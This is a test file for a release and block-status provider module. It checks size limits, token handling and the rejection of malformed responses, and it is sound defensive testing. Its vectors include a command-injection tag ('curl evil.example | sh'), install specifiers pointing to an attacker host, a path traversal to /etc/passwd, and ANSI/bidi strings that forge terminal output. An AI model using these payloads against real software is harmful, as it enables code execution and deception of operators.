import providers from '../../../src/status/providers.js';

// Characters that must never reach a terminal or the JSON output: C0 and C1 controls,
// zero width characters, line separators, bidi overrides and isolates. They are built
// from code points so that nothing invisible is embedded in this file.
const UNSAFE_RANGES = [
  [0x0000, 0x001f], [0x007f, 0x009f], [0x200b, 0x200f],
  [0x2028, 0x2029], [0x202a, 0x202e], [0x2066, 0x2069], [0xfeff, 0xfeff],
];

const CHAR = {
  ESC: String.fromCharCode(0x1b),
  BEL: String.fromCharCode(0x07),
  NUL: String.fromCharCode(0x00),
  CSI: String.fromCharCode(0x9b),
  ZWSP: String.fromCharCode(0x200b),
  LS: String.fromCharCode(0x2028),
  RLO: String.fromCharCode(0x202e),
  LRI: String.fromCharCode(0x2066),
  PDI: String.fromCharCode(0x2069),
};

/**
 * Report whether text carries a character that could rewrite or disguise output
 *
 * @param {string} text
 * @returns {boolean}
 */
function hasUnsafeCharacters(text) {
  return [...text].some((character) => {
    const codePoint = character.codePointAt(0);

    return UNSAFE_RANGES.some(([from, to]) => codePoint >= from && codePoint <= to);
  });
}

/**
 * Build a real Response so the provider exercises the same body handling as production
 *
 * @param {object|string} body
 * @param {object} [init]
 * @returns {Response}
 */
function jsonResponse(body, init = {}) {
  const payload = typeof body === 'string' ? body : JSON.stringify(body);

  return new Response(payload, {
    status: 200,
    ...init,
    headers: { 'content-type': 'application/json', ...init.headers },
  });
}

/**
 * Build a response whose body is produced on demand, so the test can observe how much
 * of it was actually read and whether it was released
 *
 * @param {object} [options]
 * @param {number} [options.chunkSize]
 * @param {number} [options.chunkCount]
 * @param {object} [options.init]
 * @returns {{response: Response, counters: {pulls: number, cancelled: boolean}}}
 */
function streamingResponse({ chunkSize = 64 * 1024, chunkCount = 64, init = {} } = {}) {
  const counters = { pulls: 0, cancelled: false };

  const body = new ReadableStream({
    pull(controller) {
      counters.pulls += 1;

      if (counters.pulls > chunkCount) {
        controller.close();

        return;
      }

      controller.enqueue(new Uint8Array(chunkSize).fill(0x41));
    },
    cancel() {
      counters.cancelled = true;
    },
  });

  return {
    counters,
    response: new Response(body, {
      status: 200,
      ...init,
      headers: { 'content-type': 'application/json', ...init.headers },
    }),
  };
}

/**
 * Run a provider call with DEBUG enabled and collect everything it printed
 *
 * @param {object} sinon
 * @param {Function} run
 * @returns {Promise<{result: *, logged: string}>}
 */
async function captureWarnings(sinon, run) {
  const previousDebug = process.env.DEBUG;

  const warn = sinon.stub(console, 'warn');

  process.env.DEBUG = '1';

  try {
    const result = await run();

    return {
      result,
      logged: warn.getCalls().map((call) => call.args.join(' ')).join(' '),
    };
  } finally {
    if (previousDebug === undefined) {
      delete process.env.DEBUG;
    } else {
      process.env.DEBUG = previousDebug;
    }
  }
}

/**
 * Set GITHUB_TOKEN for the duration of a call
 *
 * @param {string|undefined} token
 * @param {Function} run
 * @returns {Promise<*>}
 */
async function withToken(token, run) {
  const previousToken = process.env.GITHUB_TOKEN;

  if (token === undefined) {
    delete process.env.GITHUB_TOKEN;
  } else {
    process.env.GITHUB_TOKEN = token;
  }

  try {
    return await run();
  } finally {
    if (previousToken === undefined) {
      delete process.env.GITHUB_TOKEN;
    } else {
      process.env.GITHUB_TOKEN = previousToken;
    }
  }
}

describe('providers', () => {
  let fetchStub;

  beforeEach(function beforeEach() {
    fetchStub = this.sinon.stub(globalThis, 'fetch');
  });

  describe('#github.release', () => {
    it('should return the version of a release tag', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0' }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.equal('23.0.0');
    });

    it('should return the version of a prerelease tag', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v4.1.0-rc.3' }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.equal('4.1.0-rc.3');
    });

    it('should return the version of a tag published without a "v" prefix', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: '23.0.0' }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.equal('23.0.0');
    });

    it('should drop build metadata from the version', async () => {
      // Version comparison ignores build metadata, so keeping it would make a newer
      // release compare equal to the installed one, and no package manager resolves it
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0+20260728.deadbee' }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.equal('23.0.0');
    });

    it('should reject a version with leading zeroes', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v01.2.3' }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null instead of throwing when the connection fails', async () => {
      // Native fetch rejects with a TypeError("fetch failed") for connection errors
      fetchStub.rejects(new TypeError('fetch failed'));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null instead of throwing when the request times out', async () => {
      // AbortSignal.timeout aborts with a TimeoutError, not an AbortError
      fetchStub.rejects(
        new DOMException('The operation was aborted due to timeout', 'TimeoutError'),
      );

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null instead of throwing when the request is aborted', async () => {
      fetchStub.rejects(new DOMException('The operation was aborted', 'AbortError'));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null instead of throwing when the connection drops mid response', async () => {
      const body = new ReadableStream({
        start(controller) {
          controller.enqueue(new TextEncoder().encode('{"tag_name":'));
          controller.error(new TypeError('terminated'));
        },
      });

      fetchStub.resolves(new Response(body, {
        status: 200,
        headers: { 'content-type': 'application/json' },
      }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null when the API responds with a rate limit error', async () => {
      fetchStub.resolves(jsonResponse(
        { message: 'API rate limit exceeded' },
        { status: 403 },
      ));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null when a rate limited response is not JSON', async () => {
      fetchStub.resolves(new Response('<html>rate limited</html>', {
        status: 403,
        headers: { 'content-type': 'text/html' },
      }));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should return null instead of throwing when a field holds an object', async function it() {
      // Coercing a value shaped like this to a string throws, and that throw escapes
      // the provider exactly the way a missing null check does. Diagnostics are the
      // likeliest place to coerce a remote field, so this runs with them enabled.
      fetchStub.resolves(jsonResponse({ message: { toString: 'x' }, tag_name: { toString: 'x' } }));

      const { result, logged } = await captureWarnings(
        this.sinon,
        () => providers.github.release('dashpay/dash'),
      );

      expect(result).to.be.null();
      expect(hasUnsafeCharacters(logged)).to.be.false();
    });

    it('should return null when the response exceeds the maximum size', async () => {
      const oversized = JSON.stringify({
        tag_name: 'v23.0.0',
        body: 'A'.repeat(2 * 1024 * 1024),
      });

      fetchStub.resolves(jsonResponse(oversized));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should stop reading an oversized body instead of buffering it', async () => {
      // Returning null is not enough: an implementation that reads the whole body and
      // measures afterwards does exactly what the limit exists to prevent
      const { response, counters } = streamingResponse({ chunkCount: 64 });

      fetchStub.resolves(response);

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
      expect(counters.cancelled).to.be.true();
      // 1 MB is 16 chunks of 64 KB, plus the one that crosses the limit
      expect(counters.pulls).to.be.at.most(20);
    });

    it('should return null when the response declares an oversized content-length', async () => {
      const { response, counters } = streamingResponse({
        init: { headers: { 'content-length': `${8 * 1024 * 1024}` } },
      });

      fetchStub.resolves(response);

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
      // The body is never read, so it has to be released rather than left to the GC.
      // A stream fills its queue with one chunk on construction, so that one does not
      // count as reading; an implementation that read the body would pull many more.
      expect(counters.pulls).to.be.at.most(1);
      expect(counters.cancelled).to.be.true();
    });

    it('should release the body of a response it does not read', async () => {
      const { response, counters } = streamingResponse({ init: { status: 403 } });

      fetchStub.resolves(response);

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
      expect(counters.pulls).to.be.at.most(1);
      expect(counters.cancelled).to.be.true();
    });

    it('should reject a tag name carrying an npm install specifier', async () => {
      const vectors = [
        'vgit+https://evil.example/pkg',
        'git+ssh://git@evil.example/pkg.git',
        'vfile:/tmp/evil',
        'file:../../evil',
        'vnpm:evil@1.0.0',
        'https://evil.example/pkg.tgz',
        'v1.2.3 && curl evil.example | sh',
        'v../../../etc/passwd',
        'v-1.2.3',
        'v1.2',
        'vlatest',
      ];

      const results = [];

      for (const tagName of vectors) {
        fetchStub.resolves(jsonResponse({ tag_name: tagName }));

        results.push([tagName, await providers.github.release('dashpay/dash')]);
      }

      expect(results).to.deep.equal(vectors.map((tagName) => [tagName, null]));
    });

    it('should reject a tag name containing control or ANSI escape characters', async () => {
      const vectors = [
        // ANSI erase line and carriage return: rewrites the operator's terminal line
        `v1.2.3${CHAR.ESC}[2K\rInstalled 9.9.9`,
        // ANSI colour escape
        `v1.2.3${CHAR.ESC}[31m`,
        // terminal bell
        `v1.2.3${CHAR.BEL}`,
        // newline: forges an extra line for anything reading the output line by line
        'v1.2.3\n{"latestVersion":"9.9.9"}',
        // C1 control introducer, which some terminals treat as the start of a sequence
        `v1.2.3${CHAR.CSI}[31m`,
        // NUL
        `v1.2.3${CHAR.NUL}`,
        // right to left override and bidi isolates reorder what is displayed
        `v1.2.3${CHAR.RLO}9.9.9`,
        `v1.2.3${CHAR.LRI}9.9.9${CHAR.PDI}`,
        // zero width space and line separator
        `v1.2.3${CHAR.ZWSP}9`,
        `v1.2.3${CHAR.LS}forged`,
      ];

      const results = [];

      for (const tagName of vectors) {
        fetchStub.resolves(jsonResponse({ tag_name: tagName }));

        results.push([tagName, await providers.github.release('dashpay/dash')]);
      }

      expect(results).to.deep.equal(vectors.map((tagName) => [tagName, null]));
    });

    it('should return null when the release has no tag name', async () => {
      fetchStub.resolves(jsonResponse({}));

      const version = await providers.github.release('dashpay/dash');

      expect(version).to.be.null();
    });

    it('should not print control characters from a response it could not parse', async function it() {
      // The JSON parser quotes the payload it choked on, which carries remote bytes
      // into the log even though the value itself is rejected
      const forgery = `${CHAR.ESC}[2K\rdashmate is up to date${CHAR.ESC}[0m  <-- forged`;

      fetchStub.resolves(jsonResponse(forgery));

      const { result, logged } = await captureWarnings(
        this.sinon,
        () => providers.github.release('dashpay/dash'),
      );

      expect(result).to.be.null();
      expect(hasUnsafeCharacters(logged)).to.be.false();
    });

    it('should not print control characters from a rejected tag name', async function it() {
      const forgery = `v9.9.9${CHAR.ESC}[2K\r${CHAR.RLO}forged${CHAR.ZWSP}${CHAR.LS}`;

      fetchStub.resolves(jsonResponse({ tag_name: forgery }));

      const { result, logged } = await captureWarnings(
        this.sinon,
        () => providers.github.release('dashpay/dash'),
      );

      expect(result).to.be.null();
      expect(hasUnsafeCharacters(logged)).to.be.false();
    });

    it('should bound the length of what it prints about a tag name', async function it() {
      // The response size limit is the only other bound, and it allows a megabyte
      const tagName = `v1.2.3-${'a'.repeat(900 * 1024)}`;

      fetchStub.resolves(jsonResponse({ tag_name: tagName }));

      const { result, logged } = await captureWarnings(
        this.sinon,
        () => providers.github.release('dashpay/dash'),
      );

      expect(result).to.be.null();
      expect(logged.length).to.be.at.most(300);
    });

    it('should authenticate with GITHUB_TOKEN when it is present', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0' }));

      await withToken('ghp_testtoken', () => providers.github.release('dashpay/dash'));

      const [url, options] = fetchStub.firstCall.args;

      expect(url).to.equal('https://api.github.com/repos/dashpay/dash/releases/latest');
      expect(options.headers).to.have.property('Authorization', 'Bearer ghp_testtoken');
    });

    it('should authenticate with a GITHUB_TOKEN read from a file', async () => {
      // A token captured with $(cat token) keeps its trailing newline, which is an
      // illegal header value: the request would fail and look like an unreachable host
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0' }));

      const version = await withToken(
        'ghp_testtoken\n',
        () => providers.github.release('dashpay/dash'),
      );

      const [, options] = fetchStub.firstCall.args;

      expect(() => new Headers(options.headers)).to.not.throw();
      expect(options.headers).to.have.property('Authorization', 'Bearer ghp_testtoken');
      expect(version).to.equal('23.0.0');
    });

    it('should not send an Authorization header without GITHUB_TOKEN', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0' }));

      await withToken(undefined, () => providers.github.release('dashpay/dash'));

      const [url, options] = fetchStub.firstCall.args;

      expect(url).to.equal('https://api.github.com/repos/dashpay/dash/releases/latest');
      expect(options.headers).to.be.an('object');
      expect(options.headers).to.not.have.property('Authorization');
    });

    it('should not send an Authorization header for a blank GITHUB_TOKEN', async () => {
      fetchStub.resolves(jsonResponse({ tag_name: 'v23.0.0' }));

      await withToken('   ', () => providers.github.release('dashpay/dash'));

      const [, options] = fetchStub.firstCall.args;

      expect(options.headers).to.be.an('object');
      expect(options.headers).to.not.have.property('Authorization');
    });
  });

  describe('#insight.status', () => {
    it('should return the status', async () => {
      fetchStub.resolves(jsonResponse({ info: { blocks: 1337 } }));

      const status = await providers.insight('testnet').status();

      expect(status).to.deep.equal({ info: { blocks: 1337 } });
    });

    it('should return null for an unknown chain', async () => {
      const status = await providers.insight('regtest').status();

      expect(status).to.be.null();
    });

    it('should return null instead of throwing when the connection fails', async () => {
      fetchStub.rejects(new TypeError('fetch failed'));

      const status = await providers.insight('testnet').status();

      expect(status).to.be.null();
    });

    it('should return null when the response exceeds the maximum size', async () => {
      fetchStub.resolves(jsonResponse(JSON.stringify({
        info: { blocks: 1 },
        body: 'A'.repeat(2 * 1024 * 1024),
      })));

      const status = await providers.insight('testnet').status();

      expect(status).to.be.null();
    });

    it('should return null when the host answers with something other than a status', async () => {
      // A maintenance or CDN page served with a 200 arrives here as valid JSON, and
      // the caller reads the block height without re-checking that it is one
      const vectors = ['{}', '{"error":"maintenance"}', '[]', '"ok"', '42', 'null',
        '{"info":null}', '{"info":{}}', '{"info":{"blocks":"1337"}}',
        '{"info":{"blocks":1.5}}', '{"info":{"blocks":-1}}'];

      const results = [];

      for (const payload of vectors) {
        fetchStub.resolves(jsonResponse(payload));

        results.push([payload, await providers.insight('testnet').status()]);
      }

      expect(results).to.deep.equal(vectors.map((payload) => [payload, null]));
    });

    it('should return null when the block height is text carrying escape sequences', async () => {
      fetchStub.resolves(jsonResponse({
        info: { blocks: `${CHAR.ESC}[2K\rBLOCK HEIGHT SPOOFED` },
      }));

      const status = await providers.insight('testnet').status();

      expect(status).to.be.null();
    });
  });
});
